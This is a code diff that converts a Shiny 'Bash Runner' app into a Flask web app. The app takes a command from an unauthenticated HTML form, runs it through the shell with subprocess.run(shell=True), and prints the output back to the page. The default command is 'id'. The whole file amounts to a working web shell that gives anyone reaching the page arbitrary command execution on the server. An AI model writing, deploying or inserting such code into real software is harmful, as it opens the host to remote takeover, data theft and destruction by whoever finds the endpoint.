@@ -1,23 +1,30 @@
 import subprocess
-from shiny import App, ui, render
 
-app_ui = ui.page_fluid(
-    ui.h3("Bash Runner"),
-    ui.input_text_area("cmd", "Command", value="id", rows=5),
-    ui.input_action_button("go", "Run"),
-    ui.output_text_verbatim("out"),
-)
+from flask import Flask, request, render_template_string
 
+app = Flask(__name__)
 
-def server(input, output, session):
-    @output
-    @render.text
-    def out():
-        input.go()
-        p = subprocess.run(
-            input.cmd(), shell=True, capture_output=True, text=True, timeout=300
-        )
-        return (p.stdout or "") + (p.stderr or "")
+HTML = """
+<!doctype html>
+<html><body>
+<form method="post">
+  <input type="text" name="cmd" size="60" value="id">
+  <button>Run</button>
+</form>
+<pre>{{ out }}</pre>
+</body></html>
+"""
 
 
-app = App(app_ui, server)
+@app.route("/", methods=["GET", "POST"])
+def index():
+    out = ""
+    if request.method == "POST":
+        cmd = request.form.get("cmd", "")
+        p = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=300)
+        out = (p.stdout or "") + (p.stderr or "")
+    return render_template_string(HTML, out=out)
+
+
+if __name__ == "__main__":
+    app.run()
